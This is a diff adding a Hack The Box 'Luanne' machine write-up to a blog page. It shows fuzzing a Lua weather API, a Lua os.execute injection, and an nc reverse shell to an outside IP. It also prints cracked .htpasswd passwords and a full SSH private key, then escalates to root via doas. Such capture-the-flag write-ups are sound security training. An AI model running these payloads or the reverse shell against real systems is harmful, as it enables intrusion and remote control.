@@ -169,7 +169,170 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
   &#34;code&#34;: 500,
   &#34;error&#34;: &#34;unknown city: Moscow&#34;
 }
-</code></pre><h2 id=user>User</h2><h2 id=root>Root</h2></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
+</code></pre><ul><li>There is a <a href="https://www.syhunt.com/pt/index.php?n=Articles.LuaVulnerabilities" target=_blank rel=noopener>post</a> regarding <code>lua vulnerabilities</code><ul><li>If we fuzz for special chars with <code>ffuf</code> we find 2 cases there request breaks</li><li></li></ul></li></ul><pre tabindex=0><code>└─$ ffuf -w /usr/share/seclists/Fuzzing/special-chars.txt -u http://10.10.10.218/weather/forecast?city=FUZZ -mc 500 -fw 5
+
+        /&#39;___\  /&#39;___\           /&#39;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.0.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.10.218/weather/forecast?city=FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/special-chars.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 500
+ :: Filter           : Response words: 5
+________________________________________________
+
+[Status: 500, Size: 40, Words: 6, Lines: 1, Duration: 183ms]
+    * FUZZ: +
+
+[Status: 500, Size: 77, Words: 9, Lines: 2, Duration: 109ms]
+    * FUZZ: &#39;
+
+:: Progress: [32/32] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
+</code></pre><ul><li>If we try <code>'</code>, we see an error</li></ul><pre tabindex=0><code>└─$ curl &#34;http://10.10.10.218/weather/forecast?city=&#39;&#34;
+&lt;br&gt;Lua error: /usr/local/webapi/weather.lua:49: attempt to call a nil value
+</code></pre><ul><li>If we search fuzz <code>'</code> with different combinations of chars, we have nothing<ul><li>But if we add <code>--</code> which specifies the comment block in <code>lua</code>, we have the same error</li><li>So we start fuzzing the following combination <code>'FUZZ--</code> to find something</li></ul></li></ul><pre tabindex=0><code>└─$ curl &#34;http://10.10.10.218/weather/forecast?city=&#39;--&#34;
+&lt;br&gt;Lua error: /usr/local/webapi/weather.lua:49: attempt to call a nil value
+</code></pre><pre tabindex=0><code>└─$ ffuf -w /usr/share/seclists/Fuzzing/special-chars.txt -u &#34;http://10.10.10.218/weather/forecast?city=&#39;FUZZ--&#34; -mc 200,500 -fw 9
+
+        /&#39;___\  /&#39;___\           /&#39;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.0.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.10.218/weather/forecast?city=&#39;FUZZ--
+ :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/special-chars.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,500
+ :: Filter           : Response words: 9
+________________________________________________
+
+[Status: 500, Size: 37, Words: 5, Lines: 1, Duration: 106ms]
+    * FUZZ: )
+
+:: Progress: [32/32] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
+</code></pre><ul><li>And now we have the following output</li></ul><pre tabindex=0><code>└─$ curl &#34;http://10.10.10.218/weather/forecast?city=&#39;)--&#34;
+{&#34;code&#34;: 500,&#34;error&#34;: &#34;unknown city:
+</code></pre><ul><li>Let&rsquo;s try a command injection<ul><li>And it works</li></ul></li></ul><pre tabindex=0><code>└─$ curl &#34;http://10.10.10.218/weather/forecast?city=&#39;)os.execute(&#39;id&#39;)--&#34;  
+{&#34;code&#34;: 500,&#34;error&#34;: &#34;unknown city: uid=24(_httpd) gid=24(_httpd) groups=24(_httpd)
+</code></pre><ul><li>Let&rsquo;s get reverse shell<ul><li><code>curl "http://10.10.10.218/weather/forecast?city=')os.execute('rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.16.12%206666%20%3E%2Ftmp%2Ff')--"</code></li></ul></li></ul><p><img src=./images/8.png alt></p><h2 id=user>User</h2><ul><li>Let&rsquo;s enumerate<ul><li>We have a <code>.htpasswd</code></li><li><code>hashcat -m 500 hash /usr/share/wordlists/rockyou.txt</code></li><li><code>$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0:iamthebest</code></li><li>But we can do nothing with the password</li></ul></li></ul><p><img src=./images/9.png alt>
+<img src=./images/10.png alt></p><ul><li><code>/etc/passwd</code><ul><li>Another user <code>r.michaels</code></li></ul></li></ul><pre tabindex=0><code>root:*:0:0:Charlie &amp;:/root:/bin/sh
+toor:*:0:0:Bourne-again Superuser:/root:/bin/sh
+daemon:*:1:1:The devil himself:/:/sbin/nologin
+operator:*:2:5:System &amp;:/usr/guest/operator:/sbin/nologin
+bin:*:3:7:Binaries Commands and Source:/:/sbin/nologin
+games:*:7:13:&amp; pseudo-user:/usr/games:/sbin/nologin
+postfix:*:12:12:&amp; pseudo-user:/var/spool/postfix:/sbin/nologin
+named:*:14:14:&amp; pseudo-user:/var/chroot/named:/sbin/nologin
+ntpd:*:15:15:&amp; pseudo-user:/var/chroot/ntpd:/sbin/nologin
+sshd:*:16:16:&amp; pseudo-user:/var/chroot/sshd:/sbin/nologin
+_pflogd:*:18:18:&amp; pseudo-user:/var/chroot/pflogd:/sbin/nologin
+_rwhod:*:19:19:&amp; pseudo-user:/var/rwho:/sbin/nologin
+_proxy:*:21:21:Proxy Services:/nonexistent:/sbin/nologin
+_timedc:*:22:22:&amp; pseudo-user:/nonexistent:/sbin/nologin
+_sdpd:*:23:23:&amp; pseudo-user:/nonexistent:/sbin/nologin
+_httpd:*:24:24:&amp; pseudo-user:/var/www:/sbin/nologin
+_mdnsd:*:25:25:&amp; pseudo-user:/nonexistent:/sbin/nologin
+_tests:*:26:26:&amp; pseudo-user:/nonexistent:/sbin/nologin
+_tcpdump:*:27:27:&amp; pseudo-user:/var/chroot/tcpdump:/sbin/nologin
+_tss:*:28:28:&amp; pseudo-user:/var/tpm:/sbin/nologin
+_rtadvd:*:30:30:&amp; pseudo-user:/var/chroot/rtadvd:/sbin/nologin
+_unbound:*:32:32:&amp; pseudo-user:/var/chroot/unbound:/sbin/nologin
+_nsd:*:33:33:&amp; pseudo-user:/var/chroot/nsd:/sbin/nologin
+uucp:*:66:1:UNIX-to-UNIX Copy:/nonexistent:/sbin/nologin
+nobody:*:32767:39:Unprivileged user:/nonexistent:/sbin/nologin
+r.michaels:*:1000:100::/home/r.michaels:/bin/ksh
+nginx:*:1001:1000:NGINX server user:/var/db/nginx:/sbin/nologin
+dbus:*:1002:1001:System message bus:/var/run/dbus:/sbin/nologin
+</code></pre><ul><li>Processes launched by <code>r.michaels</code></li></ul><pre tabindex=0><code>$ ps auxw | grep michaels
+r.michaels  185  0.0  0.0  36460  1972 ?     Is    4:38PM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /home
+</code></pre><ul><li>We have identical application with a flags <code>-u</code> and <code>-X</code> (Enables directory indexing)<ul><li><code>Enables the transformation of Uniform Resource Locators of the form /~user/ into the directory ~user/public_html</code></li><li>Which means we can access user directory</li><li>If try it, we have no access</li></ul></li></ul><pre tabindex=0><code>$ curl -s http://127.0.0.1:3001/~r.michaels/
+&lt;html&gt;&lt;head&gt;&lt;title&gt;401 Unauthorized&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;&lt;h1&gt;401 Unauthorized&lt;/h1&gt;
+~r.michaels//: &lt;pre&gt;No authorization&lt;/pre&gt;
+&lt;hr&gt;&lt;address&gt;&lt;a href=&#34;//127.0.0.1:3001/&#34;&gt;127.0.0.1:3001&lt;/a&gt;&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;
+</code></pre><ul><li>But if use the creds from <code>.htpasswd</code>, they work</li></ul><pre tabindex=0><code>$ curl -s http://127.0.0.1:3001/~r.michaels/ -u webapi_user:iamthebest
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;&lt;head&gt;&lt;meta charset=&#34;utf-8&#34;/&gt;
+&lt;style type=&#34;text/css&#34;&gt;
+table {
+        border-top: 1px solid black;
+        border-bottom: 1px solid black;
+}
+th { background: aquamarine; }
+tr:nth-child(even) { background: lavender; }
+&lt;/style&gt;
+&lt;title&gt;Index of ~r.michaels/&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;&lt;h1&gt;Index of ~r.michaels/&lt;/h1&gt;
+&lt;table cols=3&gt;
+&lt;thead&gt;
+&lt;tr&gt;&lt;th&gt;Name&lt;th&gt;Last modified&lt;th align=right&gt;Size
+&lt;tbody&gt;
+&lt;tr&gt;&lt;td&gt;&lt;a href=&#34;../&#34;&gt;Parent Directory&lt;/a&gt;&lt;td&gt;16-Sep-2020 18:20&lt;td align=right&gt;1kB
+&lt;tr&gt;&lt;td&gt;&lt;a href=&#34;id_rsa&#34;&gt;id_rsa&lt;/a&gt;&lt;td&gt;16-Sep-2020 16:52&lt;td align=right&gt;3kB
+&lt;/table&gt;
+&lt;/body&gt;&lt;/html&gt;
+</code></pre><ul><li>We see a private key</li></ul><pre tabindex=0><code>$ curl -s http://127.0.0.1:3001/~r.michaels/id_rsa -u webapi_user:iamthebest
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+</code></pre><ul><li>Now we can connect via <code>ssh</code></li></ul><p><a href=./images/11.png></a></p><h2 id=root>Root</h2><ul><li><code>NetBSD</code> has identical to <code>sudo</code> command which <code>doas</code><ul><li>If we check config file, we see that <code>r.michaels</code> can run anything as root</li><li>But we need a password</li></ul></li></ul><p><a href=./images/12.png></a></p><ul><li>If we check home directory of the user, we have <code>backups</code> folder containing archive which is encrypted</li></ul><p><a href=./images/13.png></a></p><ul><li>The directory also contains <code>.gnupg</code>,<ul><li>If we try using the keyrings for decryption, they work</li></ul></li></ul><p><a href=./images/14.png></a></p><ul><li>Let&rsquo;s check the content of the archive<ul><li>There is a <code>.htpasswd</code> file with credentials</li><li>Crack it with <code>hashcat</code></li><li><code>webapi_user:littlebear</code></li></ul></li></ul><p><a href=./images/15.png></a>
+<a href=./images/16.png></a></p><ul><li>Use the password for <code>doas</code> and get a root flag</li></ul><p><a href=./images/17.png></a></p></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
 <a class="btn btn-sm twitter-btn" href="https://twitter.com/share?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2fluanne%2f&text=%5bHTB%5d%20Machine%3a%20Luanne&via=Personal%20Blog" target=_blank><i class="fab fa-twitter"></i></a>
 <a class="btn btn-sm reddit-btn" href="https://reddit.com/submit?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2fluanne%2f&title=%5bHTB%5d%20Machine%3a%20Luanne" target=_blank><i class="fab fa-reddit"></i></a>
 <a class="btn btn-sm linkedin-btn" href="https://www.linkedin.com/shareArticle?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2fluanne%2f&title=%5bHTB%5d%20Machine%3a%20Luanne" target=_blank><i class="fab fa-linkedin"></i></a>
